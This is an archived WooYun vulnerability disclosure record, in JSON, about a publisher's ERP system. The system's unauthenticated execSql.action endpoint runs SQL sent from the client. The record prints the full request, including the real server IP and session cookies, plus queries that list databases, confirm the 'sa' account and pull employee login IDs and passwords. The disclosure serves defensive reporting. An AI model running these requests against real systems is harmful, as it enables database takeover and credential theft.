{"id": 4, "wybug_id": "wooyun-2015-0125666", "wybug_title": "看我如何肆意操作社会科学出版社某系统数据库（奇葩设计）", "wybug_corp": "中国社会科学出版社", "wybug_author": "路人甲", "wybug_date": "2015-07-11 09:07", "wybug_open_date": "2015-08-29 17:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向公众公开  简要描述： 设计缺陷 详细说明：  目标地址：http://124.207.155.214:8080/中国社会科学出版社ERP系统\n\n在访问http://124.207.155.214:8080/系统，还未登录的时候，你会发现这样一个请求\n\n\nPOST http://124.207.155.214:8080/execSql.action HTTP/1.1Host: 124.207.155.214:8080Connection: keep-aliveContent-Length: 191Cache-Control: max-age=0Accept: application/json, text/javascript, */*; q=0.01Origin: http://124.207.155.214:8080X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://124.207.155.214:8080/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ADMINCONSOLESESSION=XKTTVdTZd38CmKMczPLQJnBwsfhlRQnkJqhTCf9qFxqn2n3sz1qT!-1439790259; JSESSIONID=4phCVpNDnSy6hBjhp8M2MLrLLkgyvpQw5XkYN7L2fwXLQhwqKJRQ!-1439790259sql=SELECT TOP 1 CONVERT(VARCHAR(50),PRJ_NEndTime,120) FROM dbo.PRJ_Notice AS PN WHERE PRJ_NIsUpdate='02' AND PRJ_NStartTime<=GETDATE() AND PRJ_NEndTime>=GETDATE() ORDER BY PRJ_NStartTime ASC\n我是看明白了，不知道大家有没看明白   漏洞证明：  \nSELECT Name FROM Master..SysDatabases ORDER BY Name\n\n\n当前用户:sa\nSELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;\n\n\n\n\n\n\n表:\n\n\nsql=Select HR_EMPLoginID,HR_EmpLoginPwd FROM HR_Employee\n大量帐号弱口令\n\n什么增删改操作当然是可以执行的进系统\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  前台删除该请求，查询不能这样写   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-15 17:49 厂商回复：    CNVD确认并复现所述情况,由CNCERT向国家上级信息安全协调机构上报,由其后续协调网站主管行政部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-11 12:14 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  奇葩我就想到了直接从客户端 传sql语句。    \n     2015-07-11 17:42 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  楼上+1    \n     2015-08-29 19:48 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 目标是当个农民)\t\t \n  直接从客户端传sql语句。。。这程序猿怎么想的    \n     2015-08-30 21:17 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @专业种田 而且还是登陆前    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}